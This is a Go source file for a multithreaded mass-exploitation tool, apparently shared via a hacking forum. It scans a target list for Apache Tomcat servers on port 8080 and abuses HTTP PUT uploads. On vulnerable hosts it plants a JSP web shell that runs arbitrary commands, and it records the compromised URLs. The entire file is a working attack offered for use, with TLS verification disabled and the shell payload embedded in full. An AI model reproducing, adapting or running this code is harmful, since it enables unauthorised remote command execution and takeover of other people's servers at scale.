package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

func red(text string) string    { return "\033[1;31m" + text + "\033[0m" }
func green(text string) string  { return "\033[1;32m" + text + "\033[0m" }
func yellow(text string) string { return "\033[1;33m" + text + "\033[0m" }

// func blue(text string) string    { return "\033[1;34m" + text + "\033[0m" }
func magenta(text string) string { return "\033[1;35m" + text + "\033[0m" }
func cyan(text string) string    { return "\033[1;36m" + text + "\033[0m" }

var (
	client = &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true}, //same as verify=False
			MaxIdleConns:        100,
			MaxIdleConnsPerHost: 100,
			IdleConnTimeout:     30 * time.Second,
		},
	}
	UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"

	count int64
	total int64

	DIR_List = []string{
		"",
		"/uploads",
		"/upload",
		"/files",
		"/file_upload",
		"/user_uploads",
		"/userfiles",
		"/user_files",
		"/media",
		"/images",
		"/img",
		"/docs",
		"/documents",
		"/assets",
		"/downloads",
		"/static",
		"/public",
		"/user_content",
		"/attachments",
		"/tmp",
		"/temp",
		"/backup",
		"/backups",
		"/export",
		"/exports",
		"/import",
		"/imports",
		"/data",
		"/content",
		"/gallery",
		"/photos",
		"/pics",
		"/webdav",
		"/work",
		"/logs",
		"/webapps",
		"/ROOT"}

	SHELL_JSP = `<%@ page import="java.io.*" %>
<html><body>
<form method="GET"><input type="text" name="cmd"><input type="submit" value="Run"></form>
<% if(request.getParameter("cmd") != null) {
Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
String l; while((l=r.readLine())!=null){ out.println(l+"<br>"); } } %>
</body></html>`
)

func CleanProtocol(target string) string {
	target = strings.TrimSpace(target)

	if strings.HasPrefix(target, "https://") {
		target = strings.TrimPrefix(target, "https://")
	} else if strings.HasPrefix(target, "http://") {
		target = strings.TrimPrefix(target, "http://")
	}

	target = strings.TrimSuffix(target, "/")
	return target
}

// https://stackoverflow.com/questions/55210301/error-handling-with-http-newrequest-in-go
func DetectProtocol(host string) (string, error) {
	Target := CleanProtocol(host)
	// fmt.Println(Target)
	var Tomcat_SSL = "http://" + Target + ":8080"
	var Tomcat_SSL2 = "http://" + Target + ":8080"

	req1, _ := http.NewRequest("GET", Tomcat_SSL, nil)
	req1.Header.Set("User-Agent", UserAgent)
	resp1, err1 := client.Do(req1)
	if err1 == nil {
		resp1.Body.Close()
		return Tomcat_SSL, nil
	}

	req2, _ := http.NewRequest("GET", Tomcat_SSL2, nil)
	req2.Header.Set("User-Agent", UserAgent)
	resp2, err2 := client.Do(req2)
	if err2 == nil {
		resp2.Body.Close()
		return Tomcat_SSL2, nil
	}

	return "", err2
}

func Upload_Backdoor(domain string) (bool, error) {
	for _, DIR := range DIR_List {
		URL_Inj := domain + DIR + "/update_log.jsp"
		Shelled, err := Put_Injector(URL_Inj, SHELL_JSP)
		if Shelled {
			file, _ := os.OpenFile("Shelled.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			defer file.Close()
			file.WriteString(URL_Inj + "\n")
			return true, err
		} else {
			fmt.Println(red("Failed Shell.JSP ==>"), URL_Inj)
		}

	}
	return false, nil
}

func Put_Injector(domain_inj string, payload string) (bool, error) {
	//URL_PUT := strings.TrimSuffix(domain, "/") + "/log_err.txt"
	URL_PUT := domain_inj
	// Put_payload := []byte("Type Exception Report\n java.lang.NullPointerException\n")
	resp, _ := http.NewRequest("PUT", URL_PUT, bytes.NewBuffer([]byte(payload)))
	resp.Header.Set("User-Agent", UserAgent)
	resp.Header.Set("Content-Type", "text/plain")
	resp.Header.Set("Content-Type", "bytes 0-4/5")
	res, err := client.Do(resp)
	if err != nil {
		return false, err
	}
	defer res.Body.Close()
	if res.StatusCode == 200 || res.StatusCode == 201 || res.StatusCode == 204 {
		res_check, _ := http.NewRequest("GET", URL_PUT, nil)
		res_check.Header.Set("User-Agent", UserAgent)
		res_ck, r_err := client.Do(res_check)

		if r_err != nil {
			return false, r_err
		}

		body_Bytes, err_byte := io.ReadAll(res_ck.Body)
		if err_byte != nil {
			return false, err_byte
		}
		defer res_ck.Body.Close()

		if strings.Contains(string(body_Bytes), "java.lang.NullPointerException") || strings.Contains(string(body_Bytes), `name="cmd"><input`) {

			return true, nil
		} else {

			return false, nil
		}
	}

	return false, nil
}

func attack(domain string) (string, error) {
	myCount := atomic.AddInt64(&count, 1)
	target := strings.TrimSpace(domain)
	pro_url, err_url := DetectProtocol(target)

	tasking := fmt.Sprintf("[%d/%d]", myCount, total)

	if err_url != nil {
		if strings.Contains(err_url.Error(), "tls") {
			fmt.Printf("%s %s ==> %s\n", tasking, magenta("Domain Down"), target)
		} else if strings.Contains(err_url.Error(), "timeout") {
			fmt.Printf("%s %s ==> %s\n", tasking, yellow("Timeout"), target)
		} else {
			fmt.Printf("%s %s ==> %s\n", tasking, red("NOT 8080"), target)
		}
	} else {
		fmt.Printf("%s %s ==> %s\n", tasking, cyan("Domain 8080"), pro_url)
		file, _ := os.OpenFile("Domain_8080.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		defer file.Close()
		file.WriteString(pro_url + "\n")

		// PUT exploit
		URL_PUT := strings.TrimSuffix(pro_url, "/") + "/log_err.txt"
		Rez, _ := Put_Injector(URL_PUT, "Type Exception Report\njava.lang.NullPointerException\n")

		if Rez {
			fmt.Printf("%s %s ==> %s\n", tasking, green("Success VULN"), URL_PUT)

			file, _ := os.OpenFile("PUT_VULN.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			defer file.Close()
			file.WriteString(URL_PUT + "\n")

			Upload_Backdoor(strings.TrimSuffix(pro_url, "/"))
		} else {
			fmt.Printf("%s %s ==> %s\n", tasking, red("Fail VULN"), pro_url)
		}
	}
	return "", nil
}

// Worker goroutine
func worker(jobs <-chan string, wg *sync.WaitGroup) {
	defer wg.Done()
	for target := range jobs {
		attack(target)
	}
}

func banner() {
	fmt.Println("\n\n\n\033[1;31m █████  ██████   █████   ██████ ██   ██ ███████      ██████   ██████  ███████ ██   ██ ██████  ██       ██████  ██ ████████ ███████ ██████  ")
	fmt.Println("██   ██ ██   ██ ██   ██ ██      ██   ██ ██          ██       ██    ██ ██       ██ ██  ██   ██ ██      ██    ██ ██    ██    ██      ██   ██ ")
	fmt.Println("███████ ██████  ███████ ██      ███████ █████       ██   ███ ██    ██ █████     ███   ██████  ██      ██    ██ ██    ██    █████   ██████  ")
	fmt.Println("\033[1;36m██   ██ ██      ██   ██ ██      ██   ██ ██          ██    ██ ██    ██ ██       ██ ██  ██      ██      ██    ██ ██    ██    ██      ██   ██ ")
	fmt.Println("██   ██ ██      ██   ██  ██████ ██   ██ ███████      ██████   ██████  ███████ ██   ██ ██      ███████  ██████  ██    ██    ███████ ██   ██ ")
	fmt.Println("\n\n\n\033[1;36m           Apache GoExploiter by \033[1;35mForums => DRCrypter.ru\033[0m")
	fmt.Println()
	fmt.Println()
	fmt.Println()
}

func main() {
	banner()
	// flags for command line (cli)
	listFile := flag.String("list", "", "Path Your target *.txt")
	maxWorkers := flag.Int("threads", 10, "Number of concurrent threads (default 10)")
	flag.Parse()

	if *listFile == "" {
		fmt.Println("Usage: go run main.go -list targets.txt -threads")
		return
	}

	// Count total lines
	total_lists, err := os.Open(*listFile)
	if err != nil {
		fmt.Println("Err opening for total list:", err)
		return
	}
	ScanTotals := bufio.NewScanner(total_lists)
	for ScanTotals.Scan() {
		total++
	}
	defer total_lists.Close()

	f_list, err := os.Open(*listFile)
	if err != nil {
		fmt.Println("Err opening list:", err)
		return
	}
	defer f_list.Close()

	jobs := make(chan string, *maxWorkers)
	var wg sync.WaitGroup

	for i := 0; i < *maxWorkers; i++ {
		wg.Add(1)
		go worker(jobs, &wg)
	}

	Mass_Scan := bufio.NewScanner(f_list)
	for Mass_Scan.Scan() {
		jobs <- Mass_Scan.Text()
	}
	close(jobs)

	wg.Wait()
}
